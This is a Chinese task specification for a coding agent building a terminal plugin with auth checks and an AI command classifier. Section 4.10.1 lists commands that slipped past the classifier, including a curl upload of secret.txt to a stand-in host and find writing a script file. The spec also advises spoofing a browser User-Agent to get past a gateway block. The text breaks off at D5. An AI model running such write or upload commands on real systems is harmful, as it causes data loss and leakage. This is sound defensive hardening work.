# TASK：magpie「终端」页面插件 —— T1 骨架 + 真终端，T2 AI 栏 + 分级执行

本文件是你（编码 agent）的唯一工作单。**先把第 0 节的四份文档读完再动手**，不要凭经验猜 magpie 的加载方式。

---

## 0. 开工前必读（不读完不许写代码）

按顺序读，全部在本仓库内：

1. `.trellis/spec/backend/magpie-plugin-contract.md` —— 宿主怎么加载插件、`server()` 返回值是什么、为什么不能实现 `stop()`
2. `.trellis/spec/backend/directory-structure.md` —— 目录与依赖方向、第 6 节的落地顺序
3. `.trellis/spec/backend/security-model.md` —— 四层门禁的原文
4. `.trellis/spec/backend/pty-lifecycle.md` —— 会话状态机、三个 Windows 坑
5. `.trellis/spec/backend/testing-guidelines.md` —— L1 分级 16 条、L2 403 矩阵 12 条，**这些是要写测试的清单**
6. `docs/architecture.md`、`docs/pty-notes.md`、`docs/security.md` —— 设计事实源
7. `.trellis/spec/frontend/ui-structure.md`、`terminal-rendering.md`、`state-management.md`、`theme-tokens.md`
8. `docs/sources/pty-probe-findings.md` —— 实测证据原文（`F:行号` 引用指向它）

文档之间如有冲突，**以 `docs/` 主文档为准**；仍冲突则停下，`needs_clarification`，不要自己裁决。

---

## 1. 目标与非目标

### 目标（本卡范围）

在 magpie 窗口侧栏增加一个「终端」页：整页是 xterm.js 真终端（node-pty + ConPTY），顶部多标签（每个标签一个 shell 会话），右侧 AI 栏（用自然语言说要干什么，返回一条命令，按分级规则决定自动执行还是等确认）。

- **T1**：骨架（`package.json` 的 magpie 段、带路页、应用页外壳）+ 真终端（多标签、resize、输入输出、退出回收）+ 四层鉴权 + 健康行
- **T2**：AI 栏（走本机 3425 网关）+ 命令分级（只读白名单自动跑，其余弹确认）+ 无 PTY 降级

### 非目标（做了就是越界）

- 不做 SSH / 多主机 / 远程终端
- 不发布到插件市场，不做 `scripts.postinstall`，不引入打包器或构建步骤
- 不做会话跨 magpie 重启保留（刷新即全丢）
- 不做内联 Ghost text 命令补全
- 不做命令历史落盘（本卡只用内存）
- 不改 `C:\Users\41807\.config\magpie\` 下任何文件，不运行 `magpie plugin add`（**真装由验收方做**）
- 不改 `docs/` 与 `.trellis/spec/` 下的文档（发现文档有错 → 在报告里列出行号，不要动）

---

## 2. 本机环境事实（已实测，不许再猜）

| 项 | 值 |
|---|---|
| Node | `v24.16.0` / npm `11.13.0`，**bun 不在 PATH** |
| 插件宿主 bun | `C:/Users/41807/.cache/magpie/bun/1.4.5/magpie-bun.exe`（文件名是 `magpie-bun.exe`，**不是 bun.exe**）；另有 1.4.4 |
| 目标端口 | `3480`，已确认空闲 |
| 会被占的端口 | 3425 网关 / 3477 page-chat / 3488 agent-console / 3496 model-quota —— **不要碰** |
| 共享依赖 | `C:/Users/41807/.config/magpie/plugins/node_modules/` 有 node-pty 1.2.0-beta.15、ws 8.22.0、zod 4.6.7 |
| 本仓库 node_modules | 已就位：`node-pty`、`ws`、`zod`、`node-addon-api`（**用这份，不要 `npm install` 联网**） |
| xterm.js | 已在 `app/vendor/xterm/`：`xterm.js` 477.2K / `xterm.css` 6.9K / `addon-fit.js` 1.5K（UMD，全局 `Terminal` 与 `FitAddon`）。**不要重新下载、不要改这三个文件**，只需补 `VERSION.md` |
| 默认 shell | `C:\Program Files\Git\bin\bash.exe` → `GNU bash, version 5.2.37(1)-release (x86_64-pc-msys)` |
| 回退 shell | `%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe` |
| 已知坏 shell | `%LOCALAPPDATA%\Microsoft\WindowsApps\bash.exe`（111 字节软链 → wsl.exe，**Linux 语义，必须显式拒掉**） |
| 日志 | `C:\Users\41807\AppData\Local\magpie\logs\app.log` |

**网关（3425）三条实测结论，直接影响实现：**

1. `GET http://127.0.0.1:3425/v1/models` → 200，返回 6 个模型（数量会变，**不要写死**，只断言 `data[]` 非空）
2. `POST /v1/chat/completions` **用 curl 或 python-urllib 会被 403**（`The site owner has blocked access based on your browser's signature`）。**必须用 node 的 `fetch()`**（undici 的默认 UA 能过），或显式设置类浏览器的 `User-Agent`。验收脚本里不许用 curl 断言 AI 链路。
3. `deepseek/deepseek-v4.1-flash` 是**推理模型**：`max_tokens` 给 64 时 `content` 为空、`finish_reason=length`（全花在 `reasoning_content`）。**代码里 `max_tokens` 不得低于 1024，用 2048**。
4. loopback 调网关**不需要 Authorization**。

---

## 3. 目录与文件清单（照此创建，不多不少）

```
package.json
index.mjs
LICENSE                 # 已存在，不要动
page/
  index.html
  boot.js
app/
  index.html
  app.js
  core/
    constants.js
    session-store.js
    ws-client.js
    api.js
  ui/
    tab-bar.js
    terminal-view.js
    status-bar.js
    ai-panel.js
  styles/
    tokens.css
    layout.css
    components.css
  vendor/xterm/
    xterm.js            # 已存在
    xterm.css           # 已存在
    addon-fit.js        # 已存在
    VERSION.md          # 你要新建
src/
  server/
    http.mjs
    ws.mjs
    auth.mjs
    routes/
      health.mjs
      policy.mjs
      ai.mjs
    static.mjs
  pty/
    bridge.mjs
    session.mjs
    sentinel.mjs
  ai/
    gateway.mjs
    context.mjs
    extract.mjs
  policy/
    classify.mjs
    allowlist.mjs
scripts/
  doctor.mjs
  check-orphans.mjs
test/
  policy/classify.test.mjs
  server/auth.test.mjs
  pty/session.test.mjs
  fixtures/
    policy-empty-allowlist.mjs
    fake-gateway-500.mjs
    slow-gateway.mjs
    fake-pty-noop.mjs
```

依赖方向（硬约束，反向 import 视为失败）：

- `index.mjs → src/server → {src/pty, src/ai, src/policy}`
- `src/ai → src/policy`
- `src/policy` **零 IO**：不许 `fs` / `net` / `http` / `child_process`，不许 `console`
- `src/server` **不许直接 import node-pty**
- `page/` 不许 import `src/`、不许 fetch/XHR/WS/EventSource、不许内联脚本、不许 CDN
- `app/` 不许读 `window.magpie`、不许连 3425（只能连自己 3480）

---

## 4. 契约（钉死，不许自行变更）

### 4.1 `package.json`

```json
{
  "name": "magpie-terminal",
  "version": "0.1.0",
  "private": true,
  "type": "module",
  "main": "./index.mjs",
  "scripts": {
    "doctor": "node scripts/doctor.mjs",
    "test": "node --test"
    **注意**：`node --test` 后面**不要加路径参数**。本机 node v24.16.0 上 `node --test test/` 会当成模块解析并直接失败（`test at test:1:1 ✖`，exit 1，实测 1 test / 1 fail），node v26.12.1 上则会静默把 `test/fixtures/*.mjs` 当测试文件跑（104 vs 108）。裸 `node --test` 在两个版本上都发现全部 `*.test.mjs` 并跳过 fixtures。

  },
  "dependencies": {
    "node-pty": "1.2.0-beta.15",
    "ws": "8.22.0",
    "zod": "4.6.7"
  },
  "engines": { "magpie": ">=0.1.1340" },
  "magpie": {
    "name": "magpie-terminal",
    "summary": {
      "en": "A real terminal with an AI command assistant",
      "zh": "带 AI 助手的真终端"
    },
    "page": {
      "title": "Terminal",
      "titles": { "zh": "终端", "zh-TW": "終端", "ja": "ターミナル" },
      "file": "page/index.html",
      "icon": "…内联 svg data URI…",
      "service": { "port": 3480, "option": "port" }
    },
    "options": { "port": 3480 }
  }
}
```

- 禁止 `scripts.postinstall` / `preinstall` / `prepare`
- `magpie.page.file` 必须是 `page/index.html`（相对仓库根）

### 4.2 `index.mjs`

```js
export default {
  id: "magpie-terminal",
  server: async (input, options) => {
    await start(options);   // 内部单飞，失败吞掉不抛
    return {};
  }
};
```

- 顶层**零副作用**（import 不建 server、不读盘、不 spawn）
- `let started = null` 单飞；**不要用「端口能不能连上」判断是否已启动**
- **不实现 `stop()`**（宿主从不调用）
- **不注册 `SIGINT` / `SIGTERM`**
- 唯一清理点是 `process.on("exit")`，里面**同步** kill 全部会话
- 启动成功必须 `console.log("[magpie-terminal] listening on http://127.0.0.1:3480")`（端口用实际值拼）
- 启动失败 `console.error` 后**不抛**（宿主会当插件崩掉）

### 4.3 带路页 `page/`

照 `page-chat` 的形态（`C:\Users\41807\.config\magpie\plugins\node_modules\@magpie-community\page-chat\page\boot.js`），改成我们的端口与文案。要点：

1. 第一件事 `await window.magpie.ready`（10 秒内必须握手，否则宿主报「页面已停止工作」）
2. `window.magpie.service` 若形如 `http(s)://…` 则优先用它（远程转发场景）
3. `await window.magpie.options.get()` 取 `port`
4. 拼 query：`theme=dark|light`、`tokens=<base64>`
   - **`tokens` 走 base64**（`btoa(unescape(encodeURIComponent(json)))`，只放非空值）
   - **不带 `token`**：带路页拿不到认证 token。真实交接见下面的 Set-Cookie 方案
5. 5 秒兜底：若 `location.replace` 没走成，把文案改成「本地终端服务没有在运行（127.0.0.1:3480）」并给「重试」按钮
6. 非 loopback 打开时给 SSH 端口转发提示
7. `page/` 的 CSP 是 `connect-src 'none'`，**不要尝试探测服务是否活着**（`no-cors` 也会被拒）

**认证 token 的真实交接方式（本卡的明确定义）**：

`server()` 的返回值不是页面内容，`page/` 是宿主发的静态文件，所以 token 只能这样交：

```
带路页 --(location.replace, 无 token)--> http://127.0.0.1:3480/?theme=..&tokens=..
服务端 http.mjs:     校验 Host/Origin 后，生成或复用进程内 token，
                     用 Set-Cookie: mt=<token>; Path=/; HttpOnly; SameSite=Strict 下发，
                     同时返回 app/index.html
以后所有 /api/* 与 WS 升级：浏览器自动带 cookie
```

- 服务端**也接受**另外两种携带方式（给脚本和测试用）：请求头 `x-magpie-term-token: <token>`、query `?token=<token>`
- cookie 名固定 `mt`
- token = `crypto.randomBytes(32).toString("hex")`（64 位 hex），**只存进程内存**，永不写盘、永不进日志（日志里只许出现前 4 位 + 长度）
- `timingSafeEqual` **先比长度**

### 4.4 应用页 `app/`

`app/index.html` 结构（不得使用内联脚本，全部外链 `<script src>`）：

```html
<!doctype html><html><head><meta charset="utf-8">
<title>终端</title>
<!-- 服务端在此处注入 <style>:root{…tokens…}</style> -->
<link rel="stylesheet" href="/vendor/xterm/xterm.css">
<link rel="stylesheet" href="/styles/tokens.css">
<link rel="stylesheet" href="/styles/layout.css">
<link rel="stylesheet" href="/styles/components.css">
</head><body>
  <div id="root" data-role="app">
    <div data-role="tabbar"></div>
    <div data-role="main">
      <div data-role="terminal-host"></div>
      <aside data-role="ai-panel"></aside>
    </div>
    <div data-role="statusbar"></div>
  </div>
  <script src="/vendor/xterm/xterm.js"></script>
  <script src="/vendor/xterm/addon-fit.js"></script>
  <script type="module" src="/app.js"></script>
</body></html>
```

- 服务端在自己发的页面上设置 CSP：`default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; font-src 'self'; connect-src 'self' ws://127.0.0.1:3480 ws://localhost:3480; base-uri 'none'; form-action 'none'; frame-ancestors 'self'`
  - **`style-src` 必须带 `'unsafe-inline'`**（2026-11-22 实测补充，原卡写成 `'self'` 是错的）。两个理由：①服务端注入的 `<style>:root{…tokens…}</style>` 是内联样式，`'self'` 只管外链样式表，实测被拦（控制台 `Applying inline style violates … style-src 'self' … The action has been blocked.`），主题变量全部失效；②xterm.js 6.0 运行期自己 `document.createElement("style")` 4 处、`setAttribute("style", …)` 1 处、`insertRule` 2 处，nonce 方案对它们无效（拿不到 nonce），只有 `'unsafe-inline'` 可行。脚本仍严格 `script-src 'self'`，不放宽。
- **打开页面必须自动有一个标签**：WS 连上（`onStatus` 变 `open`）且 store 里零会话时，**前端**立刻发 `pty.create`。store 非空（重连、已是第二页）时**不许**再建，否则重连一次就多一个标签。
  - **服务端不许在连接建立时替客户端建会话**（2026-11-22 返工第 2 轮补充）。理由：服务端分不清「真人在开页面」和「探针/核验脚本连了一下 WS」，替客户端建会话会让每一次探测都凭空多一个 `bash.exe`，`/api/health` 的 `sessions` 也对不上；自动建标签是 UI 行为，归前端。服务端只需老实执行收到的 `pty.create`。

### 4.5 HTTP 路由表

| 方法 | 路径 | 鉴权 | 说明 |
|---|---|---|---|
| GET | `/` | Host + Origin | 返回 `app/index.html`，注入 tokens，下发 `mt` cookie |
| GET | `/app.js` `/core/*` `/ui/*` `/styles/*` `/vendor/*` | Host | 静态文件，`Cache-Control: no-store`（开发期） |
| GET | `/api/health` | Host + Origin + token | `{ok:true, version, port, shell:{name,version,path,fallback}, pty:"native"|"sentinel", nodePtyVersion, sessions:n}` |
| GET | `/api/policy` | Host + Origin + token | 返回当前白名单/黑名单（供 UI 展示，只读） |
| POST | `/api/ai` | Host + Origin + token | 可选：非 WS 的备用入口，实现为空壳返回 501 也可以，但**必须存在且鉴权** |

- 未知 `/api/*` → 404，且**鉴权先于路由**（不许因为 404 就跳过鉴权）
- 请求体上限 64KB，超出 → 413
- `Host` 白名单：`127.0.0.1:3480`、`localhost:3480`（**端口必须匹配**）
- `Origin` 白名单：缺省（`undefined`）、字面量 `"null"`、`http://127.0.0.1:3480`、`http://localhost:3480`
  - **`"null"` 必须按字面量比较**，不能当「没有 Origin」
  - **不放行 `http://wails.localhost`**（若实测被拦，在报告里写明并给出建议，不要自己放宽）
- 端口被占 → 报 `PORT_IN_USE`，**不做 +1 顺延**
- 只绑 `127.0.0.1`，**禁止 `0.0.0.0` / `::`**

### 4.6 WS 帧表（本卡钉死，全项目以此为准）

路径 `ws://127.0.0.1:3480/ws`，cookie 或 `?token=` 鉴权。

| type | 方向 | payload |
|---|---|---|
| `session.created` | S→C | `{id, shell:{name,version,path,fallback}, cwd, cols, rows, pty:"native"|"sentinel"}` |
| `pty.output` | S→C | `{id, data:<base64 或 utf8 字符串>}` |
| `pty.exit` | S→C | `{id, exitCode, signal}` |
| `pty.error` | S→C | `{id, code, userText}` |
| `pty.input` | C→S | `{id, data:string}` |
| `pty.resize` | C→S | `{id, cols, rows}` |
| `pty.create` | C→S | `{cols, rows}`（新建标签） |
| `pty.close` | C→S | `{id}` |
| `ai.ask` | C→S | `{requestId, question, context:{cwd, shell, recentOutput}}` |
| `ai.reply` | S→C | `{requestId, command, reason, decision:"auto"|"confirm", policyHit}` |
| `ai.error` | S→C | `{requestId, code, userText}` |
| `pty.attach` | C→S | `{id}`（重连后认领一个仍存活的会话） |
| `session.resumed` | S→C | `{id, cwd, cols, rows, shell:{name,version,path,fallback}, pty:"native"|"sentinel", recentOutput}` |

- **`pty.log` 是 `pty.output` 的旧称，禁止使用**（文档里出现过，以本表为准）
- 帧定义的唯一住所是 `src/server/ws.mjs`；`app/core/ws-client.js` 只解码和分发
- 会话生命周期只用 `session.created` / `session.exited` / `session.failed` 三个名字（内部事件），其中 `session.exited` 对外即 `pty.exit`
- WS 升级失败：`socket.destroy()`，**绝对不许 `writeHead(403)`**（客户端会误判握手成功然后卡住）
- 所有入站帧用 `zod` 校验；校验失败 → 回 `{type:"pty.error", code:"BAD_FRAME"}`，**不断开连接**
- **会话归属与回收（`ORPHAN_GRACE_MS = 10000`）**：每个会话记下创建它的 socket（owner）。socket 关闭时，该 owner 的所有会话转入 `orphaned` 并各起一个 `ORPHAN_GRACE_MS` 定时器（取值等于前端重连退避上限，短抖动不会杀会话）。到期仍无人认领 → 走正常 `close(id)`（`kill()` + 坑 2 的约 1.07 秒延迟）。收到 `pty.attach {id}` → 取消定时器、改由新 socket 持有、回 `session.resumed`（`recentOutput` 是服务端已缓冲的最后 ≤20000 字符，供新页面重建滚动缓冲）。
  - 为什么这么做：`state-management.md` 第 5 节要求「刷新 → 所有标签消失、shell 被关闭」，同时又要求「短暂断线 → 会话保留」。刷新与断线在服务端看起来都是 socket 关闭，只能靠「新页面会不会来 attach」区分：刷新后的新页面 store 是空的，永远不会 attach 旧 id，10 秒后自然回收；断线重连的页面 store 里还留着 id，会立刻 attach。**不要**改成「socket 一关就杀」（会杀掉用户正在跑的 `vim`），也**不要**改成「永不回收」（就是本次返工要修的泄漏）。
  - `pty.attach` 的 id 不存在 → 回 `{type:"pty.error", id, code:"SESSION_GONE", userText:"这个标签的会话已经结束。"}`，前端据此移除该标签而不是永久转圈。
  - 单用户 loopback 服务，任何通过鉴权的连接都可以 attach/close 任意会话；不做 per-socket 隔离（写进注释，别自作聪明加）。

### 4.7 PTY 三个必须处理的 Windows 坑

**坑 1：`resize()` 后紧接的第一个输入字节会被吞。**
处理：服务端在 `pty.resize()` 之后立刻写一个垃圾 `"\r"`（discard），并置会话为「暖场中」，`WARMUP_MS = 350`；暖场期收到的真实 `pty.input` **排队不丢**，定时器到点后按序冲刷。定时器必须在会话关闭时 `clearTimeout`。

**坑 2：shell 自己退出时，不在 `onExit` 里无条件 `kill()`，进程永不退出。**
处理：`onExit` 里必须调 `pty.kill()`（幂等包裹，重复调用不抛）。注意 `kill()` 后约 **1.07 秒**进程才真正消失（`FLUSH_DATA_INTERVAL = 1000`），**验收断言必须等 ≥5 秒**。

**坑 3：没有本地 node_modules 时 Bun 会静默装 node-pty 1.1.0 且刷 `AttachConsole failed`。**
处理：启动时读取实际加载的 node-pty 版本（`require("node-pty/package.json").version` 或等效），若 ≠ `1.2.0-beta.15` 记 `level:"error"`、`code:"PTY_VERSION_MISMATCH"`，并在 `/api/health` 的 `nodePtyVersion` 里如实暴露。**不要自动重装。**

### 4.8 默认 shell 探测（顺序固定）

1. 配置 `options.shell` 或环境变量 `MAGPIE_TERMINAL_SHELL`
2. `%ProgramFiles%\Git\bin\bash.exe`
3. `%ProgramFiles(x86)%\Git\bin\bash.exe`
4. `%LOCALAPPDATA%\Programs\Git\bin\bash.exe`
5. PATH 里的 `bash`，但**路径含 `\WindowsApps\` 一律拒绝**（WSL 软链）
6. 全部失败 → 回退 `%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe`

校验：跑 `<path> --version`（timeout 3000ms），输出必须含 `msys` 或 `MSYS`（大小写不敏感），否则弃用继续下一个。
**禁止硬编码** Hermes 私有目录（`…\hermes\tools\git-<ver>-win32-x64\…`，带版本号，升级即失效）。
结果进程内缓存一次。UI 显示 shell 名与版本；回退时显示「PowerShell（回退）」。
node-pty 的 `name` 两种 shell 都用 `"xterm-256color"`。
`spawn` 失败只返 `PTY_SPAWN_FAILED`，**不换 shell 重试**。

### 4.9 无 PTY 降级（哨兵法）

`node-pty` 加载失败时进 `sentinel` 模式，**不影响插件可用**：

- 常驻一个 `bash.exe`（`stdio: "pipe"`，非 PTY），每条命令后追加 `printf '__DONE_%s__\n' "$?"`
- 读到 `__DONE_<code>__` 判定结束，取真实退出码
- 能流式读回输出，但**没有 TTY**：`vim` / `top` 不可用
- 前端顶部常驻提示：「降级模式：无 TTY，全屏程序不可用」
- `/api/health` 报 `pty: "sentinel"`
- 该模式必须可被测试触发：`MAGPIE_TERMINAL_FORCE_SENTINEL=1`

### 4.10 命令分级（纯函数，零 IO，永不抛）

`src/policy/classify.mjs` 导出 `classify(command, opts)` → `{decision:"auto"|"confirm", reason, hit}`。

- 步 0：**用户手敲的命令不进分级器**，直接执行
- 步 1：按 `&&` `||` `;` `|` 切段。切不开（引号不闭合、命令替换 `$( )` / 反引号）→ `confirm`
- 步 2：每段取命令头（剥掉 `sudo` / `env FOO=1` 包装）。命中黑名单 → `confirm`
- 步 3：出现 `>` / `>>` 重定向 → `confirm`
- 步 4：每段头都在只读白名单、且无重定向 → `auto`
- 步 5：其余 → `confirm`

黑名单：`rm mv del cp npm i pip install git push git reset sudo`
白名单（起始集，落在 `src/policy/allowlist.mjs`，可扩）：
`ls dir pwd cat type head tail wc stat grep rg where which echo`（**`find` 不在白名单**，见 §4.10.1）、
`node -v` / `npm -v` / `python --version` / `git status` / `git log` / `git diff` / `git branch`、
`netstat ss ping curl -I`、`docker ps`
另外一律 `confirm`：任何 `find`、`curl` 带 `-I` 之外的参数、`FOO=1 rm x`、`""`（空命令视为 noop）、非字符串入参。
`try/catch` 里**不许 `return "auto"`** —— fail-closed，出错必须 `confirm`。

#### 4.10.1 参数级收紧（**独立核验发现的真实安全回归，必须修**）

**实测被绕过**（核验会话与我双向复现，均真执行、真落盘）：

```text
classify("find . -fprint PWNED.txt")                -> auto / allow:find   → 文件被创建
classify("find . -fprintf EVIL.sh 'echo hacked\n'") -> auto / allow:find   → 脚本写入磁盘
classify("find . -fls out.txt")                     -> auto / allow:find   → 文件被创建
classify("curl -I -T secret.txt http://x/")          -> auto / allow:curl -I → 上传
classify("curl -I -K evil.cfg")                      -> auto / allow:curl -I → 配置文件可注入 output=
classify("git branch side-effect-branch")            -> auto / allow:git branch → 分支被创建
```

根因：`DANGEROUS_ARGUMENTS` / `SUBCOMMAND_DANGEROUS_ARGS` 是**危险参数黑名单**，漏一个就整条链失守 —— 与 `docs/security.md` 第 3.3 节已经写明的「黑名单永远列不全」是同一个错误，只是发生在参数层。

**修正口径（照 `docs/security.md` 3.3 的原始立场收敛，不再试图枚举 `find` 的参数）**：

1. **`find` 从白名单彻底移除**。带 `-fprint` / `-fprintf` / `-fls` / `-fprint0` / `-delete` / `-exec` 的 `find` 都会写盘或执行命令，参数空间不值得枚举 → 一律 `confirm`。
   - 文件检索的替代：`ls`、`rg -n`、`rg --files`（都在白名单内），AI 提示词里也要说明「不要用 `find`」。
2. **`curl` 只放 `-I` / `--head`，且做参数级允许集**：命令行里每个以 `-` 开头的参数必须 ∈ `{-I, --head, -s, --silent, -S, --show-error, -k, --insecure, -L, --location, -i, --include, --compressed}`；任一参数不在集合内（含 `-o -O -T -K -d -D -c -b -X -F -H --data* --output* --upload-file --config --dump-header --cookie* --request --form`）→ `confirm`。URL 作为位置参数不算危险。
3. **`git branch` 只有「无位置参数 + 参数 ⊆ `{-a,-r,-v,-vv,-l,--list,--show-current,--contains,--merged,--no-merged,--points-at}`」才 `auto`**；出现任何分支名位置参数，或 `-d -D -m -M -f -u -c -C --set-upstream-to --unset-upstream --edit-description` → `confirm`。
4. **`rg` 参数级允许集**：`-i -n -l -c -w -e -g -t -u --hidden --no-ignore -A -B -C -m --max-count --files --type --glob`；`--pre --pre-glob --hostname-bin` 或任何未列出的参数 → `confirm`。
5. **`wc` 参数级允许集**：`-l -w -c -m -L --files0-from`；其余 → `confirm`。
6. **其余白名单命令头**（`ls dir pwd cat type head tail stat grep where which echo netstat ss ping docker ps`、`node -v` / `npm -v` / `python --version` / `git status|log|diff`）参数不改语义，可不做参数级校验。
7. **短选项与长选项同等对待**（`-delete` / `--delete`）；测试要同时覆盖两种写法。
8. **不许用「把整个命令从白名单删掉」当通用解法**：`curl -I`、`git log`、`git status`、`ls`、`rg` 是每天的核心用法，全删等于废掉自动执行。只有 `find` 一个例外（理由见第 1 条）。
9. `DANGEROUS_ARGS` 表可作为第一道粗筛保留，但**最终判定以允许集/移除为准**。

### 4.11 AI 链路

- 网关：`http://127.0.0.1:3425`，路径 `/v1/chat/completions`，模型 `commandcode/deepseek/deepseek-v4.1-flash`，`max_tokens: 2048`，`timeout: 20000ms`
- **必须用 `fetch()`**（第 2 节第 2 条）
- 提示词要求模型只输出 JSON：`{"command":"…","reason":"…"}`；用 `src/ai/extract.mjs` 容错解析（剥 ```json 围栏、取第一个 `{…}`）；解析失败 → `ai.error` code `AI_BAD_JSON`
- **提示词不许写「不要执行破坏性操作」**（2026-11-22 实测踩到）：模型会按这句自我审查，把 `rm keepme.txt` 变成 `{"command":"","reason":"删除文件属于破坏性操作……"}`，前端弹「AI 没能给出可解析的命令」——用户说「删掉这个文件」永远拿不到命令，而**确认卡才是安全关口，不是模型的自我审查**。正确写法：明确告诉模型「你自己不执行命令；应用会把非只读命令放进确认卡让用户点确认，所以该给的命令要照常给出」。`sudo` 仍然禁止给（那是提权，不是普通确认）。提示词里要同时给出可执行的反例：「用户说『删掉这个文件』→ 应当给出 `rm <文件名>`，不要因为它是破坏性操作就返回空命令」。
- **提示词里必须写明「不要用 `find`，文件检索用 `rg -n` / `rg --files` / `ls`」**（`find` 已不在白名单，见 §4.10.1；模型不知道这条就会天天给 `find`，用户天天弹确认）
- 上下文只带：cwd、shell 名与版本、最近 40 行输出（截断到 2000 字符）
- 拿到 command 后**必须过 `classify()`**，把 `decision` 一起回给前端
- 网关失败 → `ai.error`，code 取 `GATEWAY_UNREACHABLE` / `GATEWAY_TIMEOUT` / `GATEWAY_HTTP_<status>`；**不许无限等**
- `Authorization` 整条不进日志；网关上 loopback 不需要它，实现里**不读 `caller-keys.json`**

- **D10 提示词不得自我审查（必过）**：问「删除当前目录下的 keepme.txt」必须在 ≥6/6 次里都返回非空 `command`（允许 `rm keepme.txt` 或 `rm -f keepme.txt`），且 `classify()` 判 `confirm`；问「看看当前目录有哪些文件」必须仍返回只读命令并判 `auto`。任一方向退化即不通过。

### 4.12 前端硬规则（来自 `frontend/quality-guidelines.md`）

- 键盘完全可达：禁正数 `tabindex`、禁 `<div onclick>`、`:focus-visible` 替 `outline:none`、隐藏标签 `inert` + `aria-selected`、Esc 关确认卡且焦点回到触发点
- 不许永久转圈：`connecting` 超 5 秒变可读错误 + 重试按钮
- 错误三要素：发生了什么 / 怎么办 / 一个按钮或命令
- 对比度：正文 ≥4.5:1、大字与非文本 ≥3:1
- 终端区最小宽 `--term-min-main: 480px`；窄窗时 AI 栏折叠为抽屉，**不许把终端缩到 0**
- `resize` 管道：去抖 → `fit()` → 发 `pty.resize` → 本地输入封锁 250–500ms 排队 `onData` 再冲刷（**垃圾 `"\r"` 由服务端发，前端没有 PTY 句柄**）
- `onData` 与 `onBinary` 都要接
- 颜色只许出现在 `styles/tokens.css` 的变量声明处；项目变量加 `--term-` 前缀
- 不建 barrel（只有 `index.js` 统一 re-export 的那种文件），每个模块「一个默认导出或一个具名导出」二者择一，DOM 查询一律用 `data-*` 钩子
- 断线指数退避 0.5/1/2/4/…上限 10s，**重连不重放输入**

### 4.13 日志

单行 JSON：`{ts, level, code, msg, sessionId?, route?, durationMs?, err?}`。
**禁用 `console.log` 打业务日志**；debug 级别也不许打终端输入内容。
token 只记前 4 位 + 长度；`tokens=<base64>` 不记原文。

---

## 5. 你要跑通的验收（必须自己执行并贴真实输出）

先 `cd C:/Users/41807/magpie-terminal`。所有命令都在这个目录下跑。

### D0 静态自检

```bash
# page/ 里不许有联网 API
grep -nE "fetch\(|XMLHttpRequest|WebSocket|EventSource" page/boot.js page/index.html ; echo "expect: exit=1"
# 全项目 http(s) 只许 loopback 或注释
grep -rnE "https?://" page app --include=*.html --include=*.js --include=*.css
# 颜色只许在 tokens.css
grep -rnE "#[0-9a-fA-F]{3,8}|rgba?\(" app/styles app/ui
# policy 零 IO
grep -nE "require\(|from \"(fs|net|http|child_process)" src/policy/*.mjs ; echo "expect: exit=1"
# server 不直接 import node-pty
grep -rn "node-pty" src/server/ ; echo "expect: exit=1"
# 不许有 stop()/信号注册
grep -rnE "SIGINT|SIGTERM|stop\s*[:=]" index.mjs src/server/*.mjs ; echo "expect: exit=1"
```

### D1 单元测试（分级器）

`node --test test/policy/classify.test.mjs` 必须覆盖 `testing-guidelines.md` 的 16 条，其中**这 6 条任一失败即安全回归**：
`rm -rf /` → confirm、`echo "unclosed` → confirm、`echo $(rm -rf x)` → confirm、`FOO=1 rm x` → confirm、`ls -la` → auto、`git status` → auto。

**negative fixture（防空转）**：用 `test/fixtures/policy-empty-allowlist.mjs`（导出空白名单）跑同一个 `classify`，断言 `ls -la` 变成 `confirm` —— 证明分级由数据驱动，不是硬编码通过。

### D2 鉴权矩阵

`node --test test/server/auth.test.mjs`，至少覆盖：

| # | 请求 | 期望 |
|---|---|---|
| 1 | 无 cookie 无 token 的 `/api/health` | 403 |
| 2 | 错 token（64 位 hex 但不匹配） | 403 |
| 3 | 长度不对的 token（32 位） | 403，且 500 不许出现 |
| 4 | `Origin: http://evil.com` + 正确 token | 403 |
| 5 | `Host: evil.com:3480`（用 `net` 原始 socket 构造） | 403 |
| 6 | `Origin: null` 字面量 + 正确 token | 200 |
| 7 | 正确 token + 自身 Origin | 200 |
| 8 | WS 无 token | 握手失败（非 101），且**没有 HTTP body** |
| 9 | 未知 `/api/nope` 无 token | 403（鉴权先于路由），不是 404 |

### D3 端到端终端（`node scripts/doctor.mjs`）

`doctor.mjs` 直接 import `src/server/http.mjs` 的 `startServer()`（拿到进程内 token），然后：

1. `GET /api/health` → 200，`pty:"native"`，`nodePtyVersion:"1.2.0-beta.15"`，`shell.name` 含 `bash`
2. WS 连接 → 收 `session.created`
3. 发 `pty.input: "echo M-$((1+1))\n"` → `pty.output` 里出现 `M-2`
   （回显里是 `echo M-$((1+1))`，结果行才是 `M-2`；断言 `M-2` 才能证明是真 PTY）
4. 发 `stty size\n` → 输出匹配 `<rows> <cols>`；再 `pty.resize {cols:132, rows:40}`，等 400ms，再 `stty size` → `40 132`
5. resize 后**立刻**连发 `echo R1-$((1+1))` … `echo R10-$((1+1))` → 10 个结果（`R1-2`…`R10-2`）全部出现（证明坑 1 的暖场排队有效）
6. 开第二个会话（`pty.create`）→ 两个 `session.created`；`pty.close` 关掉第一个 → 第二个仍能执行 `echo SECOND-$((1+1))` 并回 `SECOND-2`
7. `pty.close` 关掉最后一个 → 收 `pty.exit`
8. `node scripts/check-orphans.mjs` → 等 ≥5 秒后查 `Get-CimInstance Win32_Process` 的 pid/ppid 表，**断言无残留 shell 进程**

doctor 退出码：全过 0，任一失败 1，并把每条断言的实测值写进 `doctor-report.json`（落盘，控制台只打摘要）。

**fabricated-positive fixture（防空转）**：`test/fixtures/fake-pty-noop.mjs` 是一个返回空输出的假 PTY。写一条断言：用空输出喂给 doctor 的 `assertContains(out, "M-2")` **必须抛错**。证明第 3 步的断言不是恒真的。

### D4 AI 链路

1. 直接探网关：`node -e` 用 `fetch` 打 `/v1/models` → 200 且 `data.length > 0`
2. WS 发 `ai.ask {question:"看看当前目录有哪些文件"}` → 收 `ai.reply`，`command` 非空，`decision` 为 `auto` 或 `confirm`
3. **负向**：把网关地址指向 `test/fixtures/fake-gateway-500.mjs`（本地起一个返回 500 的服务）→ 必须收 `ai.error`，code `GATEWAY_HTTP_500`，**不许挂住**
4. **超时**：指向 `test/fixtures/slow-gateway.mjs`（永不响应）→ 必须在超时时间内收 `ai.error`，code `GATEWAY_TIMEOUT`

### D5 宿主兼容性（关键，别漏）

```bash
